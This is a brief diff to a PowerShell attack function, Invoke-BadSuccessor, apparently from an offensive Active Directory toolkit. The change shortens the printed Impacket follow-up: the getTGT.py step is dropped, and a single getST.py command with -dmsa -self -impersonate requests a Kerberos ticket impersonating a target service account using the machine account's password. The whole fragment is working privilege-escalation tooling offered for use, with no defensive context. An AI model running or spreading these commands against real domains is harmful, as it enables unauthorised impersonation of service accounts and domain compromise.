@@ -697,8 +697,7 @@ function Invoke-BadSuccessor {
     
         Write-Host ""
         Write-Host "[+] Alternative (Impacket):" -ForegroundColor Cyan
-        Write-Host "    getTGT.py '$domain/$($machine.SamAccountName):$Password'"
-        Write-Host "    KRB5CCNAME=$($machine.SamAccountName).ccache getST.py '$domain/$($machine.SamAccountName)' -k -no-pass -dmsa -self -impersonate '$($service.SamAccountName)'"
+        Write-Host "    getST.py '$domain/$($machine.SamAccountName):$Password' -k -no-pass -dmsa -self -impersonate '$($service.SamAccountName)'"
     }
 }
 
